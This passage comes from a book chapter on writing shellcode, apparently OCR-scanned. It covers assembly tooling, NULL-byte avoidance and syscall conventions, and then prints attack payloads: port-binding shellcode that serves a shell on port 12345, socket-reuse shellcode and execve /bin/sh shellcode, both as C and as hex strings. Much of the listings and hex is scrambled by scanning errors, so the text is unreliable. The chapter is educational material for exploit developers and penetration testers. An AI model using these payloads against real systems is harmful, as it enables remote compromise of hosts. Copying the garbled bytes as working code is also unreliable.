legitimate penetration testing scenarios, it is a requirement because a customer would 
certainly be unhappy if a production system or critical application were to crash during 
testing. 

Writing Shellcode I • Chapter 8 
335 
The Tools 
During the shellcode development process, you will need to make use of many tools to 
write, compile, convert, test, and debug the shellcode. Understanding how these tools work 
will help you to become more efficient in the creation of shellcode.The following is a list 
of the most commonly used tools, with pointers to more information and downloads: 
• 
nasm The nasm package contains an assembler named nasni and a disassem-
bler named ndisasm.The nasm assembly syntax is very easy to understand and 
read and therefore is often preferred above the AT&T syntax. More informa-
tion and nasm downloads can be found on their homepage at 
h ttp: / / nasm. source forge. net/. 
• 
gdb gdb is the G N U debugger. Within this chapter, we will mainly use it to 
analyze core dump files, gdb can also disassemble functions of compiled code 
by just using the command disassemble <ftmctkm nanw>.This can be very useful 
if you want to have a look at how to translate your C code to assembly lan-
guage. More information about gdb can be found on the G N U Web site at 
www.gnu.org/. 
• 
objdump objdump is a tool that can be used to disassemble files and to 
obtain important information from them. Even though we don't use it in the 
shellcode archive, it deserves some attention because it can be very useful 
during shellcode development. More information about objdump can be 
found on the G N U Web site at www.gnu.org/software/binutils/. 
• 
ktrace The ktrace utility, available on *BS1) systems only, enables kernel trace 
logging.The tool creates a file named ktrace.out, which can be viewed by 
using the kdump utility, ktrace allows you to see all system calls a process is 
using.This can be very useful for debugging shellcode because ktrace also 
shows when a system call execution fails. More information about ktrace can 
be found on most * BSD-based operating systems using the command man 
ktrace. 
• 
strace The strace program is very similar to ktrace: it can be used to trace all 
system calls a program is issuing, strace is installed on most Linux systems by 
default and can also be found for other operating systems such as IRIX.The 
strace home page can be found at www.liacs.nl/~wichert/strace/. 
• 
readelf readelf is a program that allows you to get all kinds of information 
about an ELF binary. Within this chapter, we will use readelf to locate a vari-
able in a binary and will then use that variable within shellcode. This program 
is, just like objdump, part of the G N U bintools package. More information 
about that package is available at www.gnu.org/software/binutils/. 
The Assembly Programming Language 
Every processor comes with an instruction set that can be used to write executable code 
for that specific processor type. Using this instruction set, you can assemble a program 

336 
Chapter 8 * Writing Shelkode I 
that can be executed by the processor.The instruction sets are processor type-depen-
dent; you cannot, for example, use the assembly source of a program that was written for 
an Intel Pentium processor on a Sun Sparc platform. Because assembly is a very low-
level programming language, you can write very tiny and fast programs. In this chapter, 
we will demonstrate this by writing a 23-byte piece of executable code that executes a 
file. If you write the same code in C, the end result will be hundreds of times bigger 
because of all the extra data that is added by the compiler. 
Also note that the core of most operating systems is written in assembly. If you take 
a look at the Linux and FreeBSD source codes, you will find that many system calls arc 
written in assembly. Writing programs in assembly code can be very efficient but it also 
has many disadvantages. Large programs get very complex and hard to read. Also, 
because the assembly cade is processor-dependent, you can't port it easily to other plat-
forms. It's difficult to port assembly code not only to difterent processors but also to dif-
ferent operating systems running on the same processor. This is because programs 
written in assembly code often contain hard-coded system calls—functions provided by 
the operating system-—and these differ a lot depending on the OS. 
Assembly is very simple to understand and instruction sets of processors are often 
well documented. Example 8.1 illustrates a loop in assembly. 
Example 8.1 Looping in Assembly Language 
1 
s t a r t : 
2 
xor 
e c x . e c x 
3 
mov 
ecx,10 
4 
loop 
s t a r t 
Analysis 
Within assembly, you can label a block of code using a word. We did this at line 1. 
At line 2, we XOR ECX with ECX. As a result of this instruction, ECX will 
become 0. This is the most proper way to clean a register before using it. 
At line 3, we store the value 10 in our clean ECX register. 
At line 4, we execute the loop instruction. This instruction takes the value of the 
ECX register and subtracts 1 from it. If the result of this subtraction is not equal to 0, 
then a jump is made to the label that was given as the argument of the instruction. 
The jmp instructions are also very useful in assembly (see Example 8.2).You can 
jump to a label or to a specified offset. 
Example 8.2 Jumping in Assembly Language 
jmp start 
2. 
imp 0x2 
Analysis 
The first jump will go to the place where the start label is present while the second 
jump will jump 2 bytes in front of the jmp call. Using a label is highly recommended 
because the assembler will calculate the jump offsets for you, which saves a lot of time. 

Writing Shellcode I • Chapter 8 
337 
To make executable code from a program written in assembly, you need an assem-
bler. The assembler takes the assembly code and translates it in executable bits that the 
processor understands. To be able to execute the output as a program, you need to use a 
linker such as 'Id' to create an executable object.The following is the "Hello, world" pro-
gram in C: 
™^ ^ — 
2 
w r i t e d , "Hello, world !\n',15); 
3 
e x i t ( O ) ; 
4 ) 
Example 8.3 shows the assembly code version of the C program. 
^ ^ ^ Example 8.3 The Assembly Code Version of the C Program 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
_start: 
xor 
jmp short string 
code: 
pop 
push byte 
push 
push byte 
mov 
push 
int 
xor 
push 
push 
mov 
int 
string: 
call code 
db 
'Hello, 
eax,eax 
ei: 
15 
esi 
1 
»I,4 
eax 
0x80 
eax H eax 
eax 
eax 
»1,1 
0x30 
world IH
 H Ox 
Analysis 
Because we want the end result to be an executable for FreeBSD, we have added a label 
named "_start" at the beginning of the instructions in Example 8.3. FreeBSD executa-
ble* are created with the ELF format and to make an ELF file, the linker program seeks 
"_start" in the object that was created by the assembler.The "_start" label indicates 
where the execution has to start. For now, don't worry too much about the rest of the 
code. It is explained in more detail later in this chapter. 
To make an executable from the assembly code, make an object file first using the 
nasm tool and then make an ELF executable using the linker'Id'.The following com-
mands can be used to do this: 
bash-2.05b$ nasm -f elf hello.asm 
bash-2.05bl Id -s -o hello hello.o 

338 
Chapter 8 * Writing Shelkode I 
The nasm tool reads the assembly code and generates an object file of the type "elf" 
that will contain the executable bits. The object file, which automatically gets the .o 
extension, is then used as input for the linker to make the executable. After executing 
the commands, you will have an executable named "hello".You can execute it to see the 
result: 
bash-2.05bS ./hello 
Hello, world ! 
bash-2.05b? 
The following example uses a different method to test the sheik ode /assembly exam-
ples.That C program reads the output file of nasm into a memory buffer and executes 
this buffer as though it is a function. So why not use the linker to make an executable? 
Well, the linker adds a lot of extra code to the executable bits in order to modify it into 
an executable program.This makes it harder to convert the executable bits into a shell-
code string that can be used in example C programs, which will prove critical later on. 
„ » ( „ „ 
Have a look at how much the file sizes differ between the C hello world example 
9 and the assembly example: 
1 bash-2.05b$ gcc -o hello_world hello_world,c 
2 bash-2.05bS ./hello_world 
3 Hello, world ! 
4 bash-2.05b$ Is -al hello_world 
5 -rwxr-xr-x 1 nielsh wheel 4558 Oct 2 15:31 hello_world 
6 bash-2.05b$ vi hello.asm 
7 bash-2.05b$ Is 
8 bash-2.05b$ nasm -£ elf hello.asm 
9 bash-2.05b$ Id -s -o hello hello.o 
10 bash-2.05b$ Is -al hello 
11 -rwxr-xr-x 1 nielsh wheel 436 Oct 
2 15:33 hello 
•.. N<,HI ,i 
As you can sec, the difference is huge.The file compiled from our C example is 
••-••] more than ten times bigger. If we only want the executable bits that can be executed 
and converted to a string by our custom utility, we should use different commands: 
1 bash-2.05b$ nasm -o hello hello.asm 
2 bash-2.05b$ s-prcc -p hello 
3 
4 /* The following shellcode is 43 bytes long: */ 
5 
6 char shellcode[] = 
7 
"\x31\xo0\xeb\xl3\x5e\x6a\x0£\x56Vx6a\x01\xb0\x04\x50\xod\x80-
8 
n\x31\xc0\x5O\x50\xbO\xOl\xcd\xBO\xe8\xe8\xf£\xtf\xff\x48\x65-
9 
"\x6o\x6c\x6£\x2c\x20\x77\x6£\x72\x6c\x64\x2O\x21\x0a"; 
10 
11 
12 
bash-2.05b$ nasm -o hello hello.asm 
13 bash-2.05b$ is -al hello 
14 
-rwxr-xr-x 
1 nielsh 
wheel 
43 Oct 
2 15:42 hello 
15 hash-2.05b$ s-prcc -p hello 
16 
17 char shellcode[1 = 
18 
-\x31\xc0\xeb\xl3\x5e\x6a\x0£\x56\x6a\x01\xb0\x04\x50\xcd\x80" 
19 
-\x31\xc0\x50\x50\xb0\x01\xcd\x80\xe8\xe8\xff\xff\xfr\x48\x65,• 
20 
"\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x20\x21\x0a"; 
21 
22 

Writing Shelkode I • Chapter 8 
339 
23 
bash-2. 05b$ s-proc -e hello 
24 
C a l l i n g code 
. . , 
25 
H e l l o , world ! 
26 
bash-2.05b$ 
So the eventual shell code is 43 bytes long and we can print it using our tool, s-proc, 
with the -p parameter and execute it using s-proc with the -e parameter.You'11 learn 
how to use this tool while going through the rest of the chapter. 
Windows vs UNIX Assembly 
Writing shelkode for Windows differs a lot from writing shellcode for UNIX systems. 
In Windows, you have to use functions exported by libraries, while in UNIX you can 
just use system calls.This means that in Windows you need exact pointers to the func-
tions in order to use them and you don't have the luxury of calling a function by using 
a number—as is done in UNIX. 
Hard-coding the function addresses in the Windows shellcode is possible but not 
recommended. Minor changes to the system's configuration may cause the shellcode. 
and thus your exploit, to fail, Windows shellcode writers have to use lots of tricks to get 
function addresses dynamically. Windows shellcode writing is thus harder to do and 
often results in a very large piece of shellcode. 
The Addressing Problem 
Normal programs refer to variables and functions using pointers that are often defined 
by the compiler or retrieved from a function such as malloc, which is used to allocate 
memory and returns a pointer to this memory. If you write shellcode, very often you 
like to refer to a string or other variable. For example, when you write execve shellcode, 
you need a pointer to the string that contains the program you want to execute. Since 
shellcode is injected in a program during runtime, you will have to statically identify the 
memory addresses where it is being executed. As an example, if the code contains a 
string, it will have to determine the memory address of the string before it will be able 
to use it. 
This is a big issue because if you want your shellcode to use system calls that require 
pointers to arguments, you will have to know where in memory your argument values 
are located. The first solution to this issue is finding out the location of your data on the 
stack by using the call and jmp instructions. The second solution is to push your argu-
ments on the stack and then store the value of the stack pointer ESP. We'll discuss both 
solutions in the following section. 
Using the call and jmp Trick 
The Intel call instruction may look the same as a jmp, but it isn't. When call is executed, 
it pushes the stack pointer (ESP) on the stack and then jumps to the function it received 
as an argument. The function that was called can then use ret to let the program con-
tinue where it stopped when it used call.The ret instruction takes the return address put 
on the stack by call and jumps to it. Example 8.4 shows how call and ret can be used in 
assembly programs. 

340 
Chapter 8 * Writing Shellcode I 
" N M r i s Example 8.4 call and ret 
^ ^ B 
1 
main: 
2 
3 
call 
funcl 
4 ... 
5 ... 
6 
funcl: 
7 ... 
8 
ret 
Analysis 
When the fund function is called at line 3, the stack pointer in ESP is pushed on the 
stack and a jump is made to the funcl function. 
When the funcl function is done, the ret instruction pops the return address from 
the stack and jumps to this address.This will cause the program to execute the instruc-
tions at line 4 and so on. 
Okay, time for a practical example. Let's say we want our shellcode to use a system 
call that requires a pointer to a string as an argument and we want this string to be 
Burb, We can get the memory address of the string (the pointer) using the code in 
Example 8.5. 
»-"»l^ Example 8.5 jmp 
i 
• • ^ ^ M 
1 
jmp short data 
2 
code: 
3 
pop es i 
4 
i 
5 
data: 
6 
call cod© 
7 
db 
'Burb• 
Analysis 
On line 1, we jump to the data section and within the data section , we call the code 
function (line 6).The call results that the stack point, which points to the memory loca-
tion of the line Burb, is pushed on the stack. 
On line 3, we take the memory location of the stack and store it in the ESI register. 
This register now contains the pointer to our data. 
You're probably wondering: How does jmp know where data is located? Well, jmp 
and call work with offsets.The compiler will translate "jmp short data" into something 
like "jmp short 0x4". 
The 0x4 represents the amount of bytes that have to be jumped. 
Pushing the Arguments 
The jmp/call trick to get the memory location of your data works great but makes your 
shellcode pretty big. Once you have struggled with a vulnerable program that uses very 
small memory buffers, you'll understand that the smaller the shellcode the better. In 

Writing Shelkode I • Chapter 8 
341 
addition to making the shelkode smaller, pushing the arguments will also make the 
shellcode more efficient. 
Let's say we want to use a system call that requires a pointer to a string as an argument 
and we want the string to represent Burb again. Have a look at the following code: 
1 
push 
0x42727542 
2 
mov 
e s i , e s p 
On line l.the string Burb is pushed on the stack. Because the stack grows back-
wards, the string is reversed (bruB) and converted to a HEX value.To find out what 
HEX value represents what ASCII value, have a look at the ascii man page. On line 2, 
the stack pointer (esp) is stored to the csi register. ESI now points to the string Burb. 
Note that when using push, you can only push one, two, or four bytes at the same 
time. If you want to push a string such as "Morning!", then use two pushes; 
push 0x696e6721 
; i g n i 
2 push 0x6e726f4d ;nroM 
3 move esi,esp 
If you want to push one byte, you can use push with the byte operand. The already 
given examples pushed strings that were not terminated by a NULL byte. This can be 
fixed by executing tbe following instructions before pushing the string: 
xor 
eax,eax 
2 
push b y t e al 
First, we XOR the EAX register so that it contains only zeroes. Then we push one 
byte of this register on the stack. If we now push a string, the byte will terminate the 
string. 
The NULL Byte Problem 
Shelkode is often injected in a programs memory via string functions such as readQ, 
sprintfQ, and strcpy(). Most string functions expect that the strings they are about to pro-
cess are terminated by NULL bytes. When your shellcode contains a NULL byte, this 
byte will be interpreted as a string terminator, with the result that the program accepts 
the shellcode in front of the NULL byte and discards the rest. Fortunately, there are 
many tricks to prevent your shellcode from having NULL bytes. 
For example, if you want your shellcode to use a string as an argument of a system 
call, that string must be NULL terminated. When writing a normal assembly program 
you can use the following string: 
"Hello world 
!",0x00 
Using this string in assembly code results in shellcode that contains a NULL byte. 
One workaround for this is to let the shellcode terminate the string at runtime by 
placing a NULL byte at the end of it. Have a look at the following instructions that 
demonstrate this: 
1 xor 
eax.eax 
2 mov byte 
[ebx +• 14). al 

342 
Chapter 8 * Writing Shellcode I 
In this case, the register EBX is used as a pointer to the string "Hello world !". We 
make the content of EAX 0 (or NULL) by XOR'ring the register with itself. Then we 
place AL. the 8-bit version of EAX, at offset 14 of our string. After executing the 
instructions, the string "Hello world !" will he NULL terminated and we didn't had to 
use a NULL byte in the shellcode. 
Not choosing the right registers or data types may also result in shellcode that con-
tains NULL bytes. For example, the instruction "mov 
eax.l" is translated by the com-
piler into: 
mov 
eax.0x00000001 
The compiler does this translation because we explicitly ask the 32-bit register EAX 
to be filled with the value 1. If we use the 8-bit AL register instead of EAX, no NULL 
bytes will be present in the code created by the compiler. 
Implementing System Calls 
To find out how to use a specific system call in assembly, first have a look at the system 
call's man page to get more information about its functionality, required arguments, and 
return values. An easy-to-implement system call is the exit system call. From the man 
pages on both Linux and FreeBSD, we find that the exit() system call is implemented as 
follows: 
void exit(ii\t status J ; 
This system call returns nothing and asks for only one argument, which is an integer 
value. 
When writing code in assembly for Linux and * BSD, you can call the kernel to 
process a system call by using the "hit 0x80" instruction. The kernel will then look at 
the EAX register for a system call number. If the system call number is found, the kernel 
will take the given arguments and execute the system call. 
NOTE 
Even though calling the kernel works the same for *BSD and Linux, it behaves 
%
^
—
—
*
— 
System Call Numbers 
Every system call has a unique number that is known by the kernel.These numbers are 
not often displayed in the system call man pages but can be found in the kernel sources 
and header files. On Linux systems, a header file named syscall.h contains all system call 
numbers, while on FreeBSD the system call numbers can be found in the file unistd.h. 

Writing Shellcode I • Chapter 8 
343 
System Call Arguments 
When a system call requires arguments, these arguments have to be delivered in an OS-
dependent manner. For example, FreeBSD expects that the arguments are placed on the 
stack, whereas Linux expects the arguments to be placed in registers.To find out how to 
use a system call in assembly, first look at the system call's man page to get more infor-
mation about the system calls function, required arguments, and return values. 
To illustrate how system calls have to be used on Linux and FreeBSD systems, we 
will discuss an example exit system call implementation for FreeBSD and Linux. 
Example 8.6 shows a Linux system call argument, 
^ ^ " Example 8. 6 Linux System Call 
• . • • • 
* 
• • ^ ^ ^ H 
I 
xor eax. eax 
2 
xor ebx,ebx 
3 
mov al, 1 
4 
int 0x60 
Analysis 
First we make sure the registers we're going to use are clean, which is done by using the 
XOR instruction (line 1 and 3). XOR performs a bitwise exclusive OR of the operands 
(in this case, registers) and returns the result in the destination. For example, let's say 
EAX contains the bits 11001100: 
11001100 
11001100 
XOR 
00000000 
After XORYing the EAX registers, which will be used to store the system call 
number, we XOR the EBX register that will be used to store the integer variable status. 
We will do an exit(0), so we leave the EBX register alone. If we were going to do an 
exit(l), we can do this by adding the line "inc ebx" after the "xor ebx,ebx" line.The iric 
instruction will take the value of EBX and increase it by one. Now that the argument is 
ready, we put the system call number for exit in the AL register and then call the kernel. 
The kernel will read EAX and execute the system call. 
A 
NOTE 
We put the system call number in AL and not AX or EAX because you should 
always use the smallest register possible to avoid having NULL bytes in the 
resulting shellcode. 
Before considering how an exit system call can be implemented on FreeBSD, let's 
discuss the FreeBSD kernel calling convention in a bit more detail.The FreeBSD kernel 
assumes that "int Dx8<>" is called via a function. As 3 result, the kernel expects not only 
the arguments of a system call but also a return address to be located on the stack. While 

344 
Chapter 8 * Writing Shellcode I 
this is great for the average assembly progranmier, it is bad for shellcode writers because 
we have to push four extra bytes on the stack before executing a system call. Example 
8.7 shows an implementation of exit(O) the way the FreeBSD kernel would like it. 
Example 8.7 The FreeBSD System Call 
1 
k e r n e l ; 
2 
i n t 
0x60 
3 
ret 
4 
code: 
5 
xor 
e a x , e a x 
6 
push 
eax 
7 
mov 
a l , 1 
8 
c a l l 
k e r n e l 
Analysis 
First, we make sure the EAX register represents 0 by XORVing it. Then we push EAX 
on the stack because its value will be used as the argument for the exit system call. Now 
we put 1 in AL so that the kernel knows we want it to execute the exit system call. 
Then we call the kernel function. The call instruction pushes the value of the ESP (stack 
pointer) register on the stack and then jumps to the code of the kernel function. This 
code calls the kernel with the "int 0x80", which causes exit(0) to be executed, [f the exit 
function would not terminate the program, ret is executed.The ret instruction pop's the 
return address push on the stack by call and jumps to it. 
In big programs, the following method (shown in Example 8.8) proves to be a very 
effective way to code. In shellcode, the separate function that calls the kernel is overhead 
and we will not use it. Example 8.8 shows how system calls are called in little programs 
such as shellcode. 
""h^ Example 8.8 SysCalls 
• • ^ ^ ^ H 
1 
eax.eax 
2 
push 
eax 
3 
push 
eax 
4 
mov 
a l , 1 
5 
i n t 
OxBO 
Analysis 
We make sure EAX is 0 and push it on the stack so that it can serve as the argument. 
Now we again push EAX on the stack, but this time it only serves as a workaround for 
the fact that the FreeBSD kernel expects four bytes (a return address) to be present in 
front of the system call arguments on the stack. Now we put the system call number in 
al (EAX) and call the kernel using "int 0x80". 
System Call Return Values 
The system call return values are often placed in the EAX register. However, there are 
some exceptions, such as the fork{) system call on FreeBSD, which places return values 
in different registers. 

Writing Shellcode I • Chapter 8 
345 
To find out where the return value of a system call is placed, have a look at the 
system call's man page or see how it is implemented in the libc sources. What also helps 
is to use a search engine to find assembly code with the system call you like to imple-
ment. As a more advanced approach, you can get the return value by implementing the 
system call in a C program and disassembling the function with a utility such as gdb or 
objdump. 
Remote Shellcode 
When a host is exploited remotely, a multitude of options are available to actually gain 
access to that particular machine. The first choice is usually to try the vanilla execve 
code to see if it works for that particular server. If that server duplicated the socket 
descriptors to stdout and stdin, small execve shellcode will work just fine. Often, how-
ever, this is not the case. In this section, we will explore different shellcode methodolo-
gies that apply to remote vulnerabilities. 
Port Binding Shellcode 
One of the most common shellcodes for remote vulnerabilities simply binds a shell to a 
high port.This allows an attacker to create a server on the exploited host that executes a 
shell when connected to. By far the most primitive technique, this is quite easy to 
implement in shellcode. In C, the code to create port binding shellcode looks like 
Example 8.9. 
L2111-1 Example 8.9 Port Binding Shellcode 
•••''^i 
ir.t main{void} 
2 [ 
3 
int new, sockfd = socketIAF_INET. SOCK_STREAH, 0); 
4 
struct sockaddr_in sin; 
5 
sin.sin_family • AF_IHET; 
6 
sin.5in_addr, s_addr - 0; 
7 
sin.sin_port - htons(12345) -t 
8 
bind(sockfd, (struct sockaddr *)Ssin, sizeof(sin)I; 
9 
listen(sockfd, 51; 
10 
new = accept (sockfd, NULL, 0); 
11 
forli - 2; i >- 0; i--) 
1 2 
dup2 (new, i) ; 
13 
execlf/bin/sh", "sh", NULL! ; 
14 
] 
The security research group Last Stage of Delirium, wrote some clean port binding 
shellcode for Linux. Clean shellcode is shellcode that does not contain NULL charac-
ters. NULL characters, as mentioned earlier, cause most buffer overflow vulnerabilities to 
not be triggered correctly since the function stops copying when a NULL byte is 
encountered. Example 8.10 shows this code. 
Example 8.10 sckcode 
1 char bindsckeodel 1= 
/* 73 bytes 
*/ 
2 
"\x33\xc0" 
/* xorl 
%eax,%eax 

346 
Chapter 8 * Writing Shellcode I 
3 
4 
5 
6 
7 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
28 
29 
30 
31 
32 
33 
34 
35 
36 
37 
38 
39 
40 
"\x50" 
"\x68\xff\x02\xl2\x34" 
"\x89\xe7" 
"\x50" 
"\x6a\x01" 
"\x6a\x02" 
"\x89\xel" 
•\xb0\x66" 
"\x31\xdb" 
"\x43" 
"\xcd\x80" 
"\x6a\xl0" 
"\x5T 
•\x50" 
"\x89\xel" 
"\xbO\x6S" 
"\x43" 
"\xcd\x80" 
"\xb0\x66" 
"\xb3\x04" 
"\x89\x44\x24\x04" 
"\xcd\x80" 
"\x33\xc0" 
"\x83\xc4\x0c-
"\x50" 
"\x50" 
"\xb0\x66" 
•\x43-
"\xcd\x80" 
"\x39\xc3" 
"\x31\xc9" 
"\xbl\x03" 
"\x31\xc0" 
"\xb0\x3f" 
"\x49" 
"\xcd\x80" 
"\x41" 
"\xe2\xf6"; 
Analysis 
/ 
* pushl 
/* pushl 
.' 
/ 
/ 
•
•
' 
/* 
/* 
» 
/* 
/* 
•
•
• 
.--
,-' 
/* 
•
' 
/* 
/* 
•
-
•
• 
/* 
.-' 
/* 
/* 
/* 
/' 
/* 
,-' 
/* 
/* 
•
'
•
' 
/ 
/ 
/ 
/* 
/ 
/* 
' 
* movl 
* pushl 
* pushb 
pushb 
movl 
movb 
xorl 
incl 
i nt 
pushb 
pushl 
pushl 
movl 
movb 
incl 
i nt 
movb 
movb 
movl 
int 
xor 1 
addl 
pushl 
pushl 
movb 
incl 
int. 
movl 
xorl 
• movb 
* xorl 
* movb 
decl 
* int 
incl 
loop 
%eax 
$0x341202ff 
*esp,%edi 
%eax 
$0x01 
$0x02 
%esp,%ecx 
$0x66,%al 
%ebx,%ebx 
%ebx 
$0x80 
$0x10 
%edi 
%eax 
%esp,%ecx 
$0x66,%al 
%ebx 
$0x80 
$0x66,%al 
$0x04,%bl 
%eax,0x4(%esp) 
$0x80 
%eax,%eax 
$0x0c,%esp 
%eax 
%eax 
$0x66,%al 
%ebx 
$0x80 
%eax,%ebx 
%ecx,%ecx 
$0x03,%cl 
%eax,%eax 
$0x3f,%al 
%ecx 
$0x80 
%ecx 
<:bindsckcode+6 3 > 
*/ 
*/ 
* 
*/ 
•' 
- • • • • 
*/ 
V 
*/ 
•
•
•
• 
*/ 
V 
• / 
*/ 
*/ 
*/ 
*/ 
*
•
• 
*/ 
*/ 
*/ 
*/ 
*/ 
*/ 
*/ 
*/ 
'/ 
.»,. 
*/ 
*/ 
V 
*/ 
*
,
•
• 
*/ 
*/ 
*/ 
*/ 
This code simply binds a socket to a high port (in this case, 12345) and executes a shell 
when the connection occurs.This technique is quite common, but has some problems. If 
the host being exploited has a firewall up with a default deny policy, the attacker will be 
unable to connect to the shell. 
Socket Descriptor Reuse Shellcode 
When choosing shellcode for an exploit, one should always assume that a firewall will be 
in place with a default deny policy. In this case, port binding shellcode usually is not the 
best choice. A better tactic is to recycle the current socket descriptor and utilize that 
socket instead of creating a new one. 
In essence, the shellcode iterates through the descriptor table, looking for the correct 
socket. If the correct socket is found, the descriptors are duplicated and a shell is exe-
cuted. Example 8.11 shows the C code for this. 

Writing Shellcode I • Chapter 8 
347 
""fr115" Example 8.11 Socket Descriptor Reuse Shellcode in C 
1 
ir.Ti main{void} 
2 
[ 
3 
i n t i , 
j ; 
4 
5 
j 
= sizeof{sockaddr_in}7 
6 
f o r l i = 0; i < 256; i++) 
{ 
7 
if {get peer named, &sin, kj ) < 0) 
8 
continue; 
9 
i f { s i n . s i n _ p o r t 
" 
h t o n s ( p o r t l ) 
1 0 
break; 
1 1 
> 
12 
f o r ( j = 0; j < 2; j++) 
1 3 
dup2 (j , i ) ; 
14 
e x e c l C / b i n / s h " , 
"sh", 
NULL); 
15 } 
Analysis 
This code calls getpeername on a descriptor and compares it to a predefined port that 
was chosen. If the descriptor matches the source port specified, the socket descriptor is 
duplicated to stdin and stdout and a shell is executed. By using this shellcode, no other 
connection needs to be made to retrieve the shell. Instead, the shell is spawned directly 
on the port that was exploited. Example 8.12 shows clean socket descriptor reuse shell-
code for Linux, written by Last Stage of Delirium. 
B B B ^ Example 8.12 sckcode 
m H m i 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
char findsckcode [ 3 = 
"\x31\xdb" 
"\x89\xe7" 
" \ x 8 d \ x 7 7 \ x l 0 " 
"\x89\x77\x04" 
"\x8d\x4f\x20" 
"\x89\x4f\x08" 
• \ x b 3 \ x l 0 " 
" \ x 8 9 \ x l 9 ' 
- \ x 3 1 \ x c 9 " 
• \ x b l \ x f f -
"\x89\x0f" 
- \ x 5 1 -
•\x31AxcO" 
•\xb0\x66" 
• \ x b 3 \ x 0 7 -
"\x89Vxf9" 
"\xcd\x80" 
"\x59" 
"\x31\xcUb" 
•\x39Vxd8' 
•\x75\x0a-
"\x66\xb8\xl2\x34* 
"\x66\x39\x46\x02" 
"\x74\x02-
• \ x e 2 \ x e 0 -
"\x89\xcb-
/* 72 b y t e s 
/* xorl 
1 * movl 
%ebK,%ebx 
%esp,%edi 
/* 
l e a l 
0xl0(%edi>, i e s i 
C movl 
*esi,0x4{%edi) 
/ * 
l e a l 
/* movl 
/* movb 
/* movl 
1* x o r l 
/* movb 
/* movl 
!<• pushl 
/* x o r l 
t* movb 
/* movb 
/* movl 
1* i n t 
/* popl 
/* xorl 
f* cmpl 
/*" j n e 
f* 
mow 
/* cmpw 
/ * 
j e 
/ * loop 
/* movl 
0x20(%edi), %ecx 
*ecx.0x3{*edi) 
$0x10,%bl 
*ebx,(%ecx) 
%ecx,%ecx 
$0xff,%cl 
*ecx,(%edi( 
%ecx 
%eax,%eax 
$0x56,%al 
$0x07,%bl 
%edi,%ecx 
$0x80 
%ecx 
%ebx,%ebx 
%ebx,%eax 
<: find s c kc ode+5 4 > 
$0x1234,%bx 
%bx,0x2(*esi) 
<findsokcode-t- 5 6> 
<finds c kc ode + 2 4 > 
%ecx,%ebx 
V 
*/ 
*/ 
*/ 
V 
•/ 
V 
,., 
V 
*/ 
V 
V 
*/ 
'
•
• 
*/ 
*/ 
"
• 
*/ 
V 
V 
*
.
• 
*/ 
*/ 
V 
*
.
•
• 
*/ 
*/ 

348 
Chapter 8 * Writing Shelkode I 
28 
29 
30 
31 
32 
33 
34 
35 
"\x31\xc9" 
" \ x b l \ x 0 3 " 
-\x31\xc0" 
"\xb0\x3f" 
•\x49" 
"\xcd\x80" 
" \ x 4 1 " 
•\xs2\xt6" 
/* 
x o r l 
/* movb 
• xoi : 
/* movb 
/ • 
d e c l 
/* 
i n t 
/*" i n c l 
/ * loop 
%ecx,%ecx 
S0x03,%cl 
*eax,%eax 
$0x3f,%al 
ftecx 
$0x80 
%ecx 
<fuids c kc ode+6 2 =* 
V 
V 
V 
V 
*/ 
*/ 
*/ 
*/ 
Local Shelkode 
Shelkode that is used for local vulnerabilities is also used for remote vulnerabilities. The 
differentiator between local and remote shellcode is the fact that local shelkode does not 
perform any network operations whatsoever. Instead, local shelkode typically executes a 
shell, escalates privileges or breaks out of a chroot jailed shell. In this section, we will 
cover each of these capabilities of local shellcode. 
execve Shellcode 
The most basic shellcode is execve shelkode. In essence, execve shellcode is used to exe-
cute commands on the exploited system, usually /bin/sh. execve is actually a system call 
provided by the kernel for command execution. The ability of system calls using the 
0x80 interrupt allows for easy shellcode creation. Take a look at the usage of the execve 
system call in C: 
int execvetconst char *nlename, char *const argv[]r char *const envp[J); 
Most exploits contain a variant of this shelkode. The filename parameter is a pointer 
to the name of the file to be executed. The argv parameter contains the command-line 
arguments for when the filename is executed. Lastly, the awp[j parameter contains an array 
of the environment variables that are to be inherited by the filename that is executed. 
Before constructing shelkode, we should write a small program that performs the 
desired task of our shelkode. Example 8.13 executes the file /bin/sh using the execve 
system call. 
Example 8.13 Executing/bin/sh 
1 int main(void) 
2 ( 
3 
char *argf2]; 
4 
5 
arg[0] = Vbin/sh"; 
6 
argtll = NULL; 
7 
8 
execve!"/bin/sh", arg, NULL); 
9 } 
Example 8.14 shows the result of converting the C code in Example 8.13 to 
assembly language. The code performs the same task as Example 8.13, but it has been 
optimized for size and the stripping of NULL characters. 

Writing Shelkode I • Chapter 8 
K ' . c i h i 
m
m
m 
Exa 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
mple 8.14 Byte Code 
. g l o b l main 
main: 
x o r l %edx, 
%edx 
pushl %edx 
pushl 
$0x6B732£2f 
p u s h l 
$0x6e69622f 
tnovl %esp, %ebx 
pushl %edx 
pushl %ebx 
movl %espH 
%ecx 
l e a l l l ( % e d x l , 
%eax 
18 
int $0x80 
After the assembly code in Example 8.15 is compiled, we use gdb to extract the byte 
code and place it in an array for use in an exploit.The result is shown in Example 8.15. 
S •( '. t n [ S -i Example 8.15 Exploit Shelkode 
1 
const char ejtecve [ ] = 
2 
"\x31\xd2" 
3 
4 
5 
6 
7 
8 
9 
10 
11 
"\X52-
" \ x 6 8 \ x 2 f \ x 2 f \ x 7 3 \ x 6 8 n 
•\x68\x2 f\x62\x69\x6e" 
" \ x 8 9 \ x e 3 " 
"\x52" 
•Sx53* 
" \ x 8 9 \ x e l -
•\x8d\x42\xCb' 1 
" \ x c d \ x 8 0 " ; 
/* 
/* 
/* 
/* 
/* 
/* 
/* 
x o r l %edjc, 
%edx 
/* pushl %edx 
pushl 
$0x68732f2f 
pushl 
$0x6e69622f 
movl %esp, %ebx 
pushl %edx 
/* pushl %ebx 
movl %esp. 
%ecx 
l e a l Qxb(%edx), 
%eax 
J* i n t $0x80 
*/ 
*/ 
*/ 
V 
*/ 
*/ 
*/ 
*/ 
Example 8.15 shows the shelkode that is to be used in exploits. Optimized for size, 
this shelkode comes out to be 24 bytes, containing no NULL bytes. An interesting fact 
about shelkode is that it is as much an art as it is a science. In assembly code, the same 
